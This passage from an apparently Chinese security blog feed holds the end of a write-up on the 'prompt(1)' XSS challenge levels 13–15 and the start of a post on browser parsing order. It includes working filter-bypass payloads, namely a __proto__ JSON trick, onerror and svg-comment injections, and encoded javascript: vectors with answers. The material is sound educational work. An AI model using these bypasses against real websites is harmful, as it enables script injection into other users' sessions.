<code>_</code>、 <code>:</code>、 <code>/</code>、 <code>.</code>、 以外的字符，则删除 json 的 <code>source</code> 属性：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// forbit invalid image source</span></span><br><span class="line"><span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">        <span class="keyword">delete</span> config.source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>很不幸地，我们构造的 <code>source</code> 值是满足删除标准的。换言之，若直接 input 的 JSON 如下，是无法把  <code>source</code>  属性值保留到最后的：</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"source"</span> : <span class="string">"$` onerror=prompt(1)"</span> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>最直接的想法是，能不能在 JSON 构造两个 <code>source</code> 属性骗过正则校验，使得其中一个没用的 <code>source</code>  被删除，而我们构造的 <code>source</code>  则得以保留。不过问题是，JSON 是具备 hash 特性的，若直接<strong>在同级构造两个同名属性</strong> <code>source</code> ，后者是会覆盖前者的。不过也并非一无所获，从控制台里面注意到，所构造的 JSON 对象具有一个隐藏属性 <code>__proto__</code> 。特意去查了一下这个属性的作用（详见 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank" rel="noopener">这里</a>），得知在 JS 代码中，每个 JSON 对象都具有一个隐藏属性 <code>__proto__</code> ，而这个属性本质上是一个访问器，其作用是当我们需要访问 JSON 对象中的某个属性值时，可以提供类似于 <code>getter</code> / <code>setter</code> 访问方法的语法糖。</p><blockquote><p>例如若在 JS 代码中定义一个这样的 JSON 变量 <code>var json = {&quot;source&quot;: &quot;exp&quot;}</code> ：</p><ul><li>当需要访问 <code>source</code> 的属性值时，如： <code>var src = json.source</code> ，实际上是 <code>__proto__</code> 的 <code>getter</code> 在起作用</li><li>当需要修改 <code>source</code> 的属性值时，如： <code>json.source = &quot;EXP&quot;</code> ，实际上是 <code>__proto__</code> 的 <code>setter</code> 在起作用</li></ul></blockquote><p>虽然 <code>__proto__</code> 是一个访问器，不过默认情况下，我们是不可以 <code>json.__proto__.source</code> 这样访问属性的。但有趣的是，假如在 JSON 中<strong>显式设置</strong>了 <code>__proto__</code> 属性，例如这样：<code>{&quot;__proto__&quot;: {&quot;source&quot;: &quot;exp&quot;}}</code>那么就会给 JS 解析器造成某些“混乱”，使得诸如 <code>json.__proto__.source</code> 的访问属性方式变成可能。不但如此，此时 JSON 还同时支持 <code>json.source</code> 和 <code>json.__proto__.source</code> 两种访问属性方式，且他们是等价的。利用这个特点，我们就可以在 JSON 的<strong>同级构造两个同名属性</strong>。</p><p>例如在 JS 中定义这样的一个 JSON 变量 <code>var json = {&quot;source&quot;: &quot;EXP&quot;, &quot;__proto__&quot;: {&quot;source&quot;: &quot;M02&quot;}}</code>。</p><blockquote><p>当 <code>&quot;source&quot;: &quot;EXP&quot;</code> 属性存在时：</p><ul><li><code>json.source</code>  会优先得到 <code>EXP</code> 的值</li><li><code>json.__proto__.source</code> 会得到全路径 <code>M02</code> 的值</li></ul><p>当 <code>&quot;source&quot;: &quot;EXP&quot;</code> 属性不存在时：</p><ul><li><code>json.source</code>  会通过 <code>__proto__</code> 访问器得到 <code>M02</code> 的值</li><li><code>json.__proto__.source</code> 依旧会得到全路径 <code>M02</code> 的值</li></ul></blockquote><p>回到这题，我们可以利用这个 JSON 特性进行欺骗，在 input 构造一个类似这样的 JSON ：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#123;"source": "--delete me--", "__proto__": &#123;"source": "payload"&#125;&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>其中第一个 <code>source</code> 只需要满足代码中 <code>test</code> 的正则条件使之被删除即可，这样第二个用于 payload 的 <code>source</code> 则可以保留到最后。最终构造出 payload。</p></blockquote><ul><li><code>src = &quot;URI&quot; onload = prompt(1)</code>：通过成功加载图片，调用 <code>onload</code> 事件；</li></ul><blockquote><p>无</p></blockquote><h4 id="⑤-HTML-source-13"><a href="#⑤-HTML-source-13" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&lt;img src="</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span> &gt;</span>"&gt;</span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-13"><a href="#⑥-xss-类型-13" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>这是一到综合性较大的题目，涉及的知识点有如此之多，需要好好再看看。</p></blockquote><h3 id="0x0E-BASE-64"><a href="#0x0E-BASE-64" class="headerlink" title="0x0E BASE 64"></a><font color="navy">0x0E BASE 64</font></h3><h4 id="①-JS-代码-14"><a href="#①-JS-代码-14" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-14"><a href="#②-题目分析-14" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>在这里我转载一篇文章<a href="https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level 14 - Base64" target="_blank" rel="noopener">https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2014%20-%20Base64</a> </p></blockquote><h4 id="③-相关知识点-14"><a href="#③-相关知识点-14" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><a href="https://www.jianshu.com/p/ea49397fcd13" target="_blank" rel="noopener">Data URI Scheme</a>： Data URIs 被浏览器严格限制，导致在 HTML 标签中，能够使用 Data URIs 的标签极其有限。<ul><li><code>&lt;img&gt;</code> 标签的 <code>src</code> 属性</li><li><code>&lt;object&gt;</code> 标签的 <code>data</code> 属性</li><li><code>&lt;iframe&gt;</code> 标签的 <code>src</code> 属性</li><li><code>&lt;a&gt;</code> 标签的 <code>href</code> 属性</li></ul></li><li><a href="https://blog.csdn.net/rj042/article/details/48733257" target="_blank" rel="noopener">Base64 编码原理</a></li><li><a href="http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/" target="_blank" rel="noopener">相对协议地址</a></li><li><a href="https://zh.wikipedia.org/wiki/Unicode字符列表" target="_blank" rel="noopener">Unicode 字符编码</a></li><li><a href="http://www.w3school.com.cn/html5/att_script_async.asp" target="_blank" rel="noopener"><code>&lt;script&gt;</code> 异步执行属性 <code>async</code></a></li></ol></blockquote><h4 id="④-payload-13"><a href="#④-payload-13" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><blockquote><p>参考转载的文章</p></blockquote><h4 id="⑤-HTML-source-14"><a href="#⑤-HTML-source-14" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><blockquote><p>参考转载的文章</p></blockquote><h4 id="⑥-xss-类型-14"><a href="#⑥-xss-类型-14" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p><code>date URI</code> 方案和 <code>base64</code> 的结合应用</p></blockquote><h3 id="0x0F-Length2"><a href="#0x0F-Length2" class="headerlink" title="0x0F Length2"></a><font color="navy">0x0F Length2</font></h3><h4 id="①-JS-代码-15"><a href="#①-JS-代码-15" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-15"><a href="#②-题目分析-15" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>这道题和 <code>0x07</code>  题目很像，但是这道题目将 <code>*</code> 进行了过滤，但是长度比那道题目多了一些。</p></blockquote><h4 id="③-相关知识点-15"><a href="#③-相关知识点-15" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><code>&lt;svg&gt;</code> 注释：在默认 HTML 语境下， HTML 注释是没办法在 JS 代码中使用的，但是可以借助 <code>&lt;script&gt;</code> 标签强制解析 XML 语法的特点：在 <code>&lt;scrript&gt;</code> 标签中若包含 JS 代码，即使使用 HTML 注释 <code>&lt;!-- --&gt;</code> 也是可以被成功解析的。例如：</li></ol></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line">    &lt;!-- xxxx --&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        &lt;!-- yyyy --&gt;</span><br><span class="line">        alert(<span class="number">1</span>)</span><br><span class="line">        &lt;!-- zzzz --&gt;</span><br><span class="line">        alert(<span class="number">2</span>)</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>svg&gt;</span><br></pre></td></tr></table></figure><blockquote><ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">模板字符串</a> ：在 JS 中，可以使用 倒引号（或反引号）包围字符串，字符串中再以 <code>${expression}</code> 方式入表达式，这样表达式就会被执行，例如：</li></ol></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="string">`&lt;a="1" b='2'&gt; <span class="subst">$&#123;prompt(<span class="number">1</span>)&#125;</span> by exp`</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="④-payload-14"><a href="#④-payload-14" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:<span class="string">"&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">payload2:"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">`#<span class="subst">$&#123;prompt(<span class="number">1</span>)&#125;</span>#`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>第一个是根据 <code>&lt;svg&gt;</code> 注释的知识点构造的，但是需要注意的是 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签用于声明 js 代码的范围，这两个标签不能从中间任何位置破开到两行，否则多行注释 <code>&lt;!-- --&gt;</code> 就不会起作用了。</p></blockquote><h4 id="⑤-HTML-source-15"><a href="#⑤-HTML-source-15" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--" data-comment='&#123;"id":0&#125;'&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">&lt;p class="comment" title="--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">&lt;!--<span class="string">" data-comment='&#123;"</span>id<span class="string">":1&#125;'&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"--&gt;prompt(1&lt;!--"</span> data-comment=<span class="string">'&#123;"id":2&#125;'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"--&gt;)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" data-comment='&#123;"id":3&#125;'&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">======================================================================</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">`<span class="string">" data-comment='&#123;"</span>id<span class="string">":0&#125;'&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"$&#123;prompt(1)&#125;"</span> data-comment=<span class="string">'&#123;"id":1&#125;'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" data-comment='&#123;"id":2&#125;'&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-15"><a href="#⑥-xss-类型-15" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>注释问题</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;这是我在无意中遇到的一个&lt;code&gt;xss&lt;/code&gt; 网站，花了将近一周的时间才做完，每道题的背后都会隐藏着许多知识点，其中关于n&lt;a href=&quot;[https://muzibing.github.io/2020/02/24/2020.02.2
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://muzibing.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>【知识点整理】浏览器解析：HTML解析_JS解析_URL解析</title>
    <link href="https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/24/2020.02.24（95）/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-02-27T16:20:06.498Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy一-判断下列语句能否成功执行font"><a class="markdownIt-Anchor" href="#font-color-navy一-判断下列语句能否成功执行font"></a> <font color="navy">一、判断下列语句能否成功执行</font></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">Basics</span><br><span class="line"></span><br><span class="line">0x01. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// URL encoded "javascript:alert(1)"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x02. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29"</span>&gt;</span></span><br><span class="line">// Character entity encoded "javascript" and URL encoded "alert(2)"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x03. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(3)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// URL encoded ":"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x04. <span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">// Character entity encoded <span class="tag">&lt; <span class="attr">and</span> &gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x05. <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">// Character entity encoded <span class="tag">&lt; <span class="attr">and</span> &gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute AND the character entities will NOT</span><br><span class="line">be decoded either</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x06. <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Advanced</span><br><span class="line">0x07. <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">// Character entity encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x08. <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">// Unicode escape sequence encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x09. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Character entity encoded alert(9);</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0A. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0B. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert(11)</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0C. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert and 12 </span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0D. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode escape sequence encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0E. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'14\u000a'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// escape sequence encoded line feed.</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line">Bonus</span><br><span class="line">0x0F. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br></pre></td></tr></table></figure><h3 id="font-color-navy二-相关知识font"><a class="markdownIt-Anchor" href="#font-color-navy二-相关知识font"></a> <font color="navy">二、相关知识</font></h3><h4 id="0x01-html-解析"><a class="markdownIt-Anchor" href="#0x01-html-解析"></a> 0x01 HTML 解析</h4><blockquote><p><font color="red"><strong>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那边被实体编码的内容的，即 HTML解析器 不会做解码的工作。</strong></font></p><p><strong>只有建立起DOM 树，才能对每个节点的内容进行识别，这时候如果出现实体编码，则会进行实体解码。但是这时候解析出来假如有新的标签，那么不会在加入DOM树,只是作为字符串处理。比如<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>。</strong></p><p>并且不是所有节点内容都会进行实体解码，比如<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code> 里面的代码<sup>0x04</sup>。</p><p>以上对于标签的识别，并不只是标签头本身，也包括其中的属性、结构等。</p></blockquote><p><code>小知识点：</code></p><ol><li><strong>script标签内无法解析HTML实体编码</strong>，因为其不是在 data state 数据段内，<code>SVG</code> 属于支持 <code>XML</code> 解析，所以那么我们就很好理解了，因为下 <code>xml</code> 支持在标签内解析 <code>HTML</code> 实体字符，所以在 <code>XML</code> 中(会被解析成（</li><li>当HTML 解析器处于<code>数据状态（DataState）</code>、<code>RCDATA 状态（RCDATA State）</code>、<code>属性值状态（Attribute Value State）</code>时，字符实体会被解码为对应的字符。</li><li>在原始文本元素（<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>）类型标签下的所有字符实体编码都不会被 HTML 解码。</li></ol><h4 id="0x02-javascript-解析"><a class="markdownIt-Anchor" href="#0x02-javascript-解析"></a> 0x02 JavaScript 解析</h4><p><code>javascript解析器的入口：</code></p><blockquote><ul><li><strong>标签</strong></li><li><strong>onlick</strong> <strong>等事件</strong> <strong>js</strong> <strong>的动作</strong></li><li><strong>url</strong> <strong>调用</strong> <strong>javascript:</strong> <strong>伪协议</strong></li><li><strong>css</strong> <strong>调用引入文件，或</strong> <strong>url</strong> <strong>再间接引入</strong> <strong>javascript:</strong></li><li><strong>eval()</strong> 